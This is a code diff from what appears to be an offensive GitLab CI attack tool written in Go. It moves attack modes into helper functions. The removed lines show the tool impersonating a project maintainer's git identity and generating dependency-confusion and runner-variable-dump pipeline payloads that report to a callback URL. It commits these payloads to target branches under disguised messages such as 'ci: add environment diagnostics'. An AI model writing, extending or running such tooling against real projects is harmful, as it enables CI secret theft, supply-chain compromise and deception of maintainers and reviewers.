@@ -165,15 +165,7 @@ var attackCmd = &cobra.Command{
 		}
 
 		// Impersonate a project maintainer for git author identity
-		if atkImpersonateMaintainer && strings.TrimSpace(atkTarget) != "" {
-			tmpAtt := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), "", "", 0)
-			if err := tmpAtt.ImpersonateMaintainer(ctx, atkTarget); err != nil {
-				fmt.Fprintf(cmd.ErrOrStderr(), "impersonate maintainer: %v\n", err)
-			} else {
-				atkAuthorName = tmpAtt.AuthorName
-				atkAuthorEmail = tmpAtt.AuthorEmail
-			}
-		}
+		runImpersonateMaintainer(ctx, cmd, client)
 
 		// Discovery: list runner tags and exit
 		if atkDiscoverTags {
@@ -1937,61 +1929,12 @@ var attackCmd = &cobra.Command{
 
 		// dep-confusion mode
 		if atkDepConfusion {
-			yaml := payloadgen.GenerateDepConfusionYAML(payloadgen.DepConfusionOptions{
-				Common: payloadgen.CommonOptions{
-					JobName: strings.TrimSpace(atkJobName),
-					Stage:   strings.TrimSpace(atkStage),
-					Image:   strings.TrimSpace(atkImage),
-					Tags:    parseTags(atkTags),
-					Manual:  atkManual,
-				},
-				PackageName: strings.TrimSpace(atkDepConfusionPackage),
-				Version:     strings.TrimSpace(atkDepConfusionVersion),
-				Ecosystem:   strings.TrimSpace(atkDepConfusionEcosystem),
-				CallbackURL: strings.TrimSpace(atkWebhook),
-			})
-			if atkPayloadOnly {
-				_, err := fmt.Fprintln(cmd.OutOrStdout(), yaml)
-				return err
-			}
-			if strings.TrimSpace(atkMessage) == "" {
-				atkMessage = "ci: add dependency audit step"
-			}
-			finalBranch, err := commitPayloadToBranch(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail, atkMessage, yaml)
-			if err != nil {
-				return fmt.Errorf("commit dep-confusion payload: %w", err)
-			}
-			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Dependency confusion payload committed to branch %s", finalBranch))
-			return nil
+			return runDepConfusion(ctx, cmd, client)
 		}
 
 		// runner-var-dump mode
 		if atkRunnerVarDump {
-			yaml := payloadgen.GenerateRunnerVarDumpYAML(payloadgen.RunnerVarDumpOptions{
-				Common: payloadgen.CommonOptions{
-					JobName: strings.TrimSpace(atkJobName),
-					Stage:   strings.TrimSpace(atkStage),
-					Image:   strings.TrimSpace(atkImage),
-					Tags:    parseTags(atkTags),
-					Manual:  atkManual,
-				},
-				Method:      strings.TrimSpace(atkRunnerVarDumpMethod),
-				Filter:      strings.TrimSpace(atkRunnerVarDumpFilter),
-				CallbackURL: strings.TrimSpace(atkWebhook),
-			})
-			if atkPayloadOnly {
-				_, err := fmt.Fprintln(cmd.OutOrStdout(), yaml)
-				return err
-			}
-			if strings.TrimSpace(atkMessage) == "" {
-				atkMessage = "ci: add environment diagnostics"
-			}
-			finalBranch, err := commitPayloadToBranch(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail, atkMessage, yaml)
-			if err != nil {
-				return fmt.Errorf("commit runner-var-dump payload: %w", err)
-			}
-			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Runner var dump payload committed to branch %s", finalBranch))
-			return nil
+			return runRunnerVarDump(ctx, cmd, client)
 		}
 
 		// secrets mode
